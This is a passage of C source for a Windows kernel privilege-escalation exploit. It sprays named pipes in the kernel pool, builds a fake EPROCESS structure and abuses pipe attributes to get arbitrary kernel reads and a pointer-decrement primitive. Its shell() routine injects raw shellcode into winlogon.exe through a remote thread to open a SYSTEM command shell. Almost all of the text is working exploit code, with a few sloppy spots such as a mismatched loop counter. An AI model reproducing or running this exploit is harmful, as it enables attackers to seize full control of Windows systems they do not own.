	
			char dummy[0x100];
			DWORD dummr = 0;
			
			/
			HANDLE goster_w[0x1000];
			HANDLE goster_r[0x1000];
			DWORD newde2 = 0;
			char gost_buffer[0x50];
			memset(gost_buffer, 0x43, sizeof(gost_buffer));

			char gost_buffer1[0x50];
			memset(gost_buffer, 0x45, sizeof(gost_buffer));
			
			
			ReadFile(read3[g_index], dummy, 1, &dummr,NULL);
			
			//CloseHandle(write3[g_index]);
			//WriteFile(write3[g_index], gost_buffer1, 0x250-0x40, &newde2, NULL);
	
			//CloseHandle(read3[g_index]);
			
			for (int i = 0; i < 400; i++)
			{
				CreatePipe(&goster_r[i], &goster_w[i], NULL, 0x250 - 0x40);
			}

			for (int i = 0; i < 400; i++)
			{
				
				WriteFile(goster_w[i],gost_buffer, 0x250 - 0x40, &newde2, NULL);

			}
			
			//WriteFile(write3[g_index], gost_buffer, 0x250 - 0x40, &newde2, NULL);

			
			 
			
			printf("[+]Closing finale write pipe handles\n");
		
			for (int i = 0; i <= 400; i++)
			{
				CloseHandle(finale_w[i]);
				CloseHandle(finale_r[i]);
				
			}
			free(finale_w);
			free(finale_r);
			free(finale);
			

			char finale1[0x200];

		
			printf("[+] Fake Eprocess +0x540  : 0x%llx\n",(DWORD64)(fake_eprocess+0x590));
			printf("[+] ExpPoolQuotaCookie    : 0x%llx\n",(DWORD64)copy6);
			printf("[+] Ghost address         : 0x%llx\n",(DWORD64)ghostaddress1);
			printf("[+] Second ProcessBilled Pointer i sat :0x%llx\n", (((DWORD64)(fake_eprocess + 0x590)) ^ (DWORD64)copy6 ^ (DWORD64)ghostaddress1));

			
			*((unsigned char*)finale1 + 0x40) = 0x0;
			*((unsigned char*)finale1 + 0x41) = 0x0;
			*((unsigned char*)finale1 + 0x43) = 0x8;
			*((unsigned char *)finale1 + 0x42) = 0xe4;
			*(uint32_t*)((unsigned char*)finale1 + 0x44) = 0x55545452;
			*(uintptr_t *)((unsigned char *)finale1 + 0x48) = (((DWORD64)(fake_eprocess + 0x590)) ^ (DWORD64)copy6 ^ (DWORD64)ghostaddress1);

			*(uintptr_t *)((unsigned char *)(finale1 + 0x50)) = root_queue;
			*(uintptr_t *)((unsigned char *)(finale1 + 0x58)) = root_queue;
			*(uintptr_t *)((unsigned char *)finale1 + 0x60) = (uintptr_t)0;
			*(uintptr_t *)((unsigned char *)finale1 + 0x68) = (uintptr_t)0;
			*(uintptr_t *)((unsigned char *)finale1 + 0x70) = 0;
			*(unsigned long *)((unsigned char *)finale1 + 0x78) = (unsigned long)current_pipe_offset;
			*(unsigned long *)((unsigned char *)finale1 + 0x7c) = (unsigned long)0;

			
			printf("[+] Again respraing final write!\n");
			DWORD newde1 = 0;
			for (int i = 0; i <= 500; i++)
			{
				CreatePipe(&finale_r1[i], &finale_w1[i], NULL, 0x170 - 0x40);
			}

			for (int i = 0; i <= 500; i++)
			{
				WriteFile(finale_w1[i], finale1, 0x170 - 0x40, &newde1, NULL);
			}

			
			printf("[+] Closing ghost pipes for final decrementation!\n");
			DWORD dummr4 = 0;
			char dummy1[0x100 ];


			//ReadFile(read3[g_index], dummy1, 1, &dummr4, NULL);
			
			for (int i = 0; i < 400; i++)
			{

				ReadFile(goster_r[i], &dummy1,5, &dummr4, NULL);

			}
			
			//ReadFile(read3[g_index], dummy1, 1, &dummr4, NULL);
			CloseHandle(write3[g_index]);
			CloseHandle(read3[g_index]);
			
			
			for (int j = 0; j < 400; j++)
			{
				CloseHandle(goster_w[i]);
				
			}
			
			

			printf("[+] Check privileges for the process!\n");
			system("pause");
			
			shell();
			
			
			printf("[+] Closing handles for resprayed objects and ghost chunks\n");
			
			

			for (int i = 0; i <= 0x8000; i++)
			{
				CloseHandle(read2[i]);
				CloseHandle(write2[i]);
			}

			CancelIoEx(handle2, &overlap3);
			break;

		}

	}

	return 0;
}

//From synactiv team's public resources.
void shell()
{

	HANDLE snap = CreateToolhelp32Snapshot(0x00000002, NULL);
	if (snap == INVALID_HANDLE_VALUE)
	{
		printf("Unable to create a snapshot of the processes : %d\n", GetLastError());
		system("pause");
		
	}
	PROCESSENTRY32 pentry;
	pentry.dwSize = sizeof(PROCESSENTRY32);
	DWORD processID = 0;
	char *filename = "winlogon.exe";
	while (Process32Next(snap, &pentry))
	{
		if (!_wcsicmp(L"winlogon.exe", (const wchar_t*)pentry.szExeFile))
		{
			processID = pentry.th32ProcessID;
			printf("[+] Process : %S   PID : %d\n", (char *)pentry.szExeFile, processID);
			break;
		}
	}
	HANDLE hSystemProcess = INVALID_HANDLE_VALUE;
	PVOID  pLibRemote;
	// DWORD processID;
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
		"\x00";



	hSystemProcess = OpenProcess(GENERIC_ALL, 0, processID);

	if (hSystemProcess == INVALID_HANDLE_VALUE || hSystemProcess == (HANDLE)0)
	{
		printf("[-] Couldn't open system process...\n");
		exit(1);
	}
	printf("[+]Got a handle on a system Process: %08p\n", hSystemProcess);


	pLibRemote = VirtualAllocEx(hSystemProcess, NULL, sizeof(shellcode) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!pLibRemote)
	{
		printf("[-]Virtual alloc failed !\n");
		exit(0);
	}

	printf("[+]Allocation in system process succeded with address %08p\n", pLibRemote);

	if (!WriteProcessMemory(hSystemProcess, pLibRemote, shellcode, sizeof(shellcode), NULL))
	{
		printf("[-]WriteProcessMemory failed !\n");
		exit(1);
	}

	HANDLE hThread = CreateRemoteThread(hSystemProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLibRemote, NULL, 0, NULL);

	printf("[+]Writing in system process succeded\n");

	if (hThread == NULL) {
		printf("[-]CreateRemoteThread failed !\n");
		exit(1);
	}
	else
		printf("[+]Remote thread created !\n");
	CloseHandle(hSystemProcess);
}

void arbitread(char *out,size_t size,uintptr_t where, DWORD index)
{
	
	
	char arb_read[0x1000]; 
	fake_pipe_queue_entry->data_ptr= where - current_pipe_offset;
	DWORD reed = 0;
	ReadFile(read3[index], arb_read, size,&reed,NULL);
	//printf("[+] Arbit Read returns 0x%llx\n", arb_read);
	current_pipe_offset += size;
	memcpy(out, arb_read, size);
}
void npp_alloc_fake_eprocess( char *fake_process,char * fake_eprocess_buf,int g_index)
{
	uintptr_t fake_eprocess_attribute;
	// The pipe queue entry list is corrupted, use the pipe attribute to store arbitrary data in the kernel
	//set_pipe_attribute(&xploit->ghosts->pipes[xploit->ghost_idx], fake_eprocess_buf, NAME_TAG2_LEN + (FAKE_EPROCESS_SIZE * 2));
//
	IO_STATUS_BLOCK status;
	char output[0x100];

	memset(output, 0x42, 0xff);

	NtFsControlFile(write3[g_index],
		NULL,
		NULL,
		NULL,
		&status,
		0x11003C, //0x11002C for arg of set attribute is 2
		fake_eprocess_buf,
		0x2000-0x30,
		output,
		sizeof(output)
	);
	// We can read prev or next of the root to find the attribute that contains the arbitrary data
	arbitread((char *)&fake_eprocess_attribute, 0x8,root_attribute+8,g_index);
	printf("[+] fake_eprocess_attribute is : 0x%llx\n", fake_eprocess_attribute);

	// The data of the fake EPROCESS is at fake_eprocess_attribute->AttributeValue
	arbitread((char *)&fake_eprocess,8,fake_eprocess_attribute + 0x20,g_index);
	printf("[+] fake_eprocess is : 0x%llx\n", fake_eprocess);
}

void initFakeEprocess(PVOID addr, DWORD64 addr_to_decrement)
{
	memset((PVOID)addr, 0x41, 0x540);

	addr = (PVOID)((DWORD64)addr+0x50);
	DWORD64 save = (DWORD64)addr;
	DWORD64 temp = save + 4;
	DWORD64 QuotaValues = 0xAAAAAAAAAAAAAcfc;
	DWORD64 QuotaValues2 = 0xAAAAAAAAAAA255dc;

	memset((char *)addr - 0x40, 0xA, 0x40);
	memset((char *)addr - 0x18, 0xB, 0x1);
	memset(addr, 0x3, 1);

	// temp = (DWORD64)((char *)pTokenObject + 0x48);
	temp = (DWORD64)((char *)addr_to_decrement);
	printf("[+] Address to decrement : 0x%llx\n", temp);
	memcpy((char *)addr + 0x410, &temp, sizeof(DWORD64));
	for (int i = 0xd8; i < 0xf0; i++)
	{
		memset((char *)addr + i, 2 + (i - 0xd4), 1);
	}

	// precise values are need here, but we can't put any 0x0000 in the structure or it won't be copied
	// in kernel memory
	memcpy((char *)addr + 0xc0, &QuotaValues, 4); 
	memcpy((char *)addr + 0xc4, &QuotaValues2, 4);
	memcpy((char *)addr + 0xc8, &QuotaValues, 4);
	memcpy((char *)addr + 0xcc, &QuotaValues2, 4);
}
void initFakeEprocess1(PVOID addr, DWORD64 addr_to_decrement)
{
	memset((PVOID)addr, 0x41, 0x540);

	addr = (PVOID)((DWORD64)addr+0x50);
	
	DWORD64 save = (DWORD64)addr;
	DWORD64 temp = save + 4;
	DWORD64 QuotaValues = 0xAAAAAAAAAAAAAcfc;
	DWORD64 QuotaValues2 = 0xAAAAAAAAAAA255dc;

	memset((char *)addr - 0x40, 0xA, 0x40);
	memset((char *)addr - 0x18, 0xB, 0x1);
	memset(addr, 0x3, 1);

	// temp = (DWORD64)((char *)pTokenObject + 0x48);
	temp = (DWORD64)((char *)addr_to_decrement);
	printf("[+] Address to decrement : 0x%llx\n", temp);
	memcpy((char *)addr + 0x410, &temp, sizeof(DWORD64));
	for (int i = 0xd8; i < 0xf0; i++)
	{
		memset((char *)addr + i, 2 + (i - 0xd4), 1);
	}

	// precise values are need here, but we can't put any 0x0000 in the structure or it won't be copied
	// in kernel memory
	memcpy((char *)addr + 0xc0, &QuotaValues, 4);
	memcpy((char *)addr + 0xc4, &QuotaValues2, 4);
	memcpy((char *)addr + 0xc8, &QuotaValues, 4);
	memcpy((char *)addr + 0xcc, &QuotaValues2, 4);
}

DWORD writeattribute()
{
	//spray pipe objects
	pNtFsControlFile NtFsControlFile = (pNtFsControlFile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtFsControlFile");
	if (!NtFsControlFile)
	{
		printf("[-] Unable to find NtfsControlFile in ntdll lib : %d\n", GetLastError());
		system("pause");
		return -1;
	}
	return 0;


	char attribute[100] = { 0 };
	memset(attribute, 0x56, 0x5);
	char output[0x100];
	DWORD bufsize = 0x160;
	IO_STATUS_BLOCK status = { 0 };
	DWORD buf[0x100] = { 0x2323232323 };
	DWORD res = 0;

	for (int i = 0; i <= 0x500; i++)
	{

		CreatePipe(&read_pipe[i], &write_pipe[i], NULL, bufsize);
	}
	//WriteFile(write_pipe, buf, 0x160, &res, NULL);


	for (int i = 0; i <= 0x500; i++)
	{
		NtFsControlFile(&write_pipe[i],
			NULL,
			NULL,
			NULL,
			&status,
			0x11003C,
			attribute,
			0x170 - 0x38,
			output,
			sizeof(output)
		);
	}
	return 1;
}
uintptr_t findcurrenteprocess()
{
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("GetProcAddress() failed.\n");
		
	}
	PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
	if (NtAllocateVirtualMemory == NULL) {
		printf("GetProcAddress() failed.\n");
		
	}
	ULONG len = 0;
	query(SystemModuleInformation, NULL, 0, &len);

	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	if (pModuleInfo == NULL) {
		printf("Could not allocate memory for module info.\n");
		
	}
	NTSTATUS status = query(SystemModuleInformation, pModuleInfo, len, &len);

	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
		
	}

	UINT64 kernelImageBase = (UINT64)pModuleInfo->Modules[0].ImageBaseAddress;
	char imagename[0x100];
	lstrcpyA(imagename, pModuleInfo->Modules[0].Name);
	//printf("%s   : 0x%llx\n", imagename, kernelImageBase);//(char *)pModuleInfo->Modules[0].Name, kernelImageBase);

	DWORD cpid = GetCurrentProcessId();
	HANDLE self = OpenProcess(PROCESS_QUERY_INFORMATION, NULL, cpid);

	printf("[+] Current Process Id : 0x%X\n", cpid);
	HANDLE ntos = LoadLibraryA("ntoskrnl.exe");
	//HANDLE ntos2 = GetModuleHandle(L"ntoskrnl.exe");
	if (!ntos)
	{
		printf("[+] Get LastError %d\n", GetLastError());
		system("pause");
		
	}
	
	HANDLE self2 = NULL;
	uintptr_t eprccess;
	DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(), &self2, NULL, NULL, NULL);
	ULONG len1 = 4096 * 256 * 100;
	DWORD tony = 0;
	PSYSTEM_HANDLE_INFORMATION phandleinfo = (PSYSTEM_HANDLE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len1);
	query(SystemHandleInformation, phandleinfo, len1, &tony);
	int c = 1;
	UINT i;
	uintptr_t newt;
	printf("[+]Handke Count : %d\n",phandleinfo->HandleCount);
	for ( i = 0; i < phandleinfo->HandleCount; i++)
	{
		//printf("%x \n", phandleinfo->Handles[i].ProcessId);

		if (phandleinfo->Handles[i].ProcessId == cpid)
		{
			//Object Type :7
			//printf("ObjectType:%d\n", phandleinfo->Handles[i].ObjectTypeNumber);
			//printf("Handle:%x,OpenProcessHandle:%x,DuplicateHandle:%x\n", phandleinfo->Handles[i].Handle, self, self2);
			//puts("");
			if (phandleinfo->Handles[i].Handle == (USHORT)self )
			{

				// *(uintptr_t*)eprocess = (uintptr_t)phandleinfo->Handles[i].Object;
				if (phandleinfo->Handles[i].ObjectTypeNumber == 7)
				{
					printf("[+] Current Process is at : 0x%llx\n", phandleinfo->Handles[i].Object);
					return  (uintptr_t)phandleinfo->Handles[i].Object;
				}
				//printf("[+] Current Process is at : 0x%llx\n", phandleinfo->Handles[i].Object);
					//eprocess-=0x2bf410;
				/*
				newt = (uintptr_t)phandleinfo->Handles[0].Object;
				if (newt > (uintptr_t)phandleinfo->Handles[1].Object)
				{
					return newt;
				}
				
				else
				{
				*/
				/*
					if ((((uintptr_t)phandleinfo->Handles[i].Object & 0xffff000000000080) == 0xffff000000000080) || (((uintptr_t)phandleinfo->Handles[i].Object & 0xffff0000000000c0) == 0xffff0000000000c0))
					{
						
						printf("[+] Current Process is at : 0x%llx\n", phandleinfo->Handles[i].Object);
						return (uintptr_t)phandleinfo->Handles[i].Object;
					}
					else
					{
						continue;
					}
					*/
				//}
			}

		}

	}
	
	return  (uintptr_t)phandleinfo->Handles[i].Object;
	
}


DWORD readattribute()
{
	//spray pipe objects
	pNtFsControlFile NtFsControlFile = (pNtFsControlFile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtFsControlFile");
	if (!NtFsControlFile)
	{
		printf("[-] Unable to find NtfsControlFile in ntdll lib : %d\n", GetLastError());
		system("pause");
		return -1;
	}
	return 0;


	char attribute[100] = "pipe\4";

	DWORD bufsize = 0x160;
	IO_STATUS_BLOCK status = { 0 };
	DWORD buf[0x100] = { 0x2323232323 };
	DWORD res = 0;



	//WriteFile(write_pipe, buf, 0x160, &res, NULL);



	NtFsControlFile(&read_pipe,
		NULL,
		NULL,
		NULL,
		&status,
		0x110038,
		attribute,
		0x260 - 0x38,
		output,
		0x200
	);

	printf("[+] Information IO_STATUS_BLOCK : %x\n", status.Information);
	printf("[+] Pointer in IO_STATUS_VLOCK : %x \n", status.Pointer);


	return 1;
}


